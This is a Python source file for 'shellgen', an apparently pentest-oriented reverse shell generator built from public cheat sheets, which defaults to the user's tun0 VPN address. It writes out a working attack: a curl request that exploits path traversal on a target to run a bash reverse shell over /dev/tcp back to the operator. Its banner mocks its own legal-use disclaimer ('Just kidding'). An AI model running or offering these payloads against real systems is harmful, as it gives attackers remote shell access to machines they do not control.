#! /usr/bin/env python3
# -*- coding: utf-8 -*-

# Reverse shell generator based on examples pulled from:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# This is uses the tun0 IPv4 address. Enter a specific port after calling the script

import sys
import os
import argparse
import subprocess
from time import sleep
from src.design import print_error, print_info, print_shell, print_shell_types, bcolors, print_list_shells
from src.core import return_shells

# Support between python2 and python3
try: input = raw_input
except: pass

# List of shells available
shells = ["bash","go","nc","curl","netcat","msfvenom","perl","php","python","powershell","ruby","xterm","telnet"]

def create_launcher():
	try:
		print_info("Creating launcher...")
		"""
		Create a launcher to execute shellgen from the commandline.
		"""
		cwd = os.getcwd()
		filewrite = open("/usr/local/bin/shellgen", "w")
		filewrite.write('#!/bin/sh\ncd %s\nchmod +x shellgen\n./shellgen "$@"' % (cwd))
		filewrite.close()
		subprocess.Popen("chmod +x /usr/local/bin/shellgen", shell=True).wait()
		
		print_info("Launcher has been created.")
		print_info("Now you can run shellgen from anywhere in the terminal")
	except Exception as error:
		print_error(error)

# Grab the latest update
def update():
	# force https for git
	def git_https_force():
		subprocess.Popen('git config --global url."https://github.com/".insteadOf git@github.com:;git config --global url."https://".insteadOf git://', shell=True).wait()

	# force https
	git_https_force()

	# try to update ourself first
	print_info("Trying to update myself first... Then will generate the shellcode...")
	subprocess.Popen("git pull", shell=True).wait()
	print_info("Remember, if there was a new update, terminate this session and re-run the script\n")
	sleep(2)


def banner():
	__version__ = '0.8 THIS ONE IS THE BOMB!'

	banner = bcolors.DARKGREEN + """
	███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
	██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
	███████╗███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
	╚════██║██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
	███████║██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
	╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
	""" +bcolors.ENDC
	banner += """
	Version: """ + bcolors.YELLOW + str(__version__) + bcolors.DARKGREEN + """\n
	Author: The Joker (@__Th3J0k3r__) (github.com/thejoker3000)
	Website: https://thegibson.xyz"""
	banner += """
	Reverse shell generator.
	This is uses the tun0 IPv4 address.\n\tEnter a specific port after calling the script
	"""
	banner += bcolors.RED+ """
	!!!!!! DISCLAIMER !!!!!!
	This tool is developed only for legal purposes.
	Just kidding. Have fun! :-)
	""" + bcolors.ENDC
	
	return banner

def return_curl_shell():
	target = input("Enter target:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
	rport = input("Enter target port:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
	curl = """curl -s -X POST 'http://"""+target+""":"""+rport+"""/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1"'"""
	print(bcolors.YELLOW+"[1] "+bcolors.ENDC+curl)


def main():
	try:
		global update
		group = argparse.ArgumentParser()
		
		group.add_argument("-ip", "--lhost", help="Your IP or hostname")
		#group.add_argument("--target", "--rhost", help="Target IP or hostname")
		group.add_argument("-p", "--lport", "--port", help="The port to be used (default will be 4444)")
		group.add_argument("-s", "--shell", help="Type of reverse shell to use")
		group.add_argument("-u", "--update", help="When given this argument it will update and continue", action="store_true")
		group.add_argument("-ls", "--shells", help="Lists all available shells", action="store_true")
		group.add_argument("-c", "--create-launcher", help="Creates a launcher to run anywhere in terminal (requires sudo)", action="store_true")
		group.add_argument("--no-update", help="Skip the update check (DO NOT USE - NOT WORKING AS IT SHOULD)", action="store_true")
		group.add_argument("-m", "--manual", help="Read the manual for guidance (Shows README.md file)", action="store_true")
		
		args = group.parse_args()

		if args.update:
			update()

		'''if args.update and len(sys.argv) > 2:
			update()			
			os.system("clear")
			print(banner())
		else:
			print_info("Only updating and I will leave you alone")
			update()
			sys.exit()'''
		
		if args.create_launcher:
			create_launcher()
			sys.exit()
		
		if args.shells:
			for i in shells:
				print_shell_types(i)
			sys.exit()
		
		if args.manual:
			os.system("cat README.md | more")
			sys.exit()
		
		if args.no_update:
			update = False

		if args.lhost:
			print_info("Running through checks now...")
			sleep(1)
			print_info("IP has been given...")
			ip = args.lhost
		else:
			print_error("No IP was given...")
			print_info("Using your VPN IP address...")
			ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
			
		if args.lport:
			print_info("Port has been given...")
			port = args.lport
		else:
			print_info("No port given but going to use the default (4444)...")
			port = "4444"

		if args.shell:
			print_info("A shell type was given also...")
			if "curl" in args.shell:
				return_curl_shell()
				sys.exit()
			if "msfvenom" in args.shell:
				target = input("Enter target:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
				
			else:
				shell = args.shell
				return_shells(shell, ip, port)
		else:
			shell = input("\nWhat shell would you like to use? ")
			if shell in shells:
				print_info("OK. Now I have a shell to use...")
				return_shells(shell, ip, port)
				sys.exit()
			else:
				print_error("No shell was given again or shell entered is not available yet.")
				sys.exit()
	
	except KeyboardInterrupt:
		print()
		print_error("Aborting all cyber operations")
		sys.exit()
	except IndexError as ie:
		print()
		print_error("Houston, we have a problem!")
		print(ie)
		print_error("Make sure you are connected to the VPN or have internet connection")
		sys.exit()



if __name__ == "__main__":
	os.system("clear")
	print(banner())
	main()
